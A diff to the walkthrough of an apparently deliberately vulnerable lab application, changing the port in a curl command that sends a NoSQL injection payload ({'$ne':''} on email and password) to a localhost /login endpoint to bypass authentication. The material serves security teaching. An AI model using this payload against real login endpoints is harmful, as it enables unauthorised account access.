@@ -73,7 +73,7 @@ So, to exploit this application, you must to send a NoSQL query on email and pas
 You can do this via curl and only can be exploited with this tool, simply make a request containing the NoSQL query on email and passwords fields to login endpoint:
 
 ```sh
-curl -X 'POST' 'http://localhost:9995/login' -H "Content-Type: application/json" --data '{"email": {"$ne":""}, "password": {"$ne":""}}'
+curl -X 'POST' 'http://localhost:10001/login' -H "Content-Type: application/json" --data '{"email": {"$ne":""}, "password": {"$ne":""}}'
 ```
 
 The application will return the first user that MongoDB find, and you'll see a message containing "Hello user".
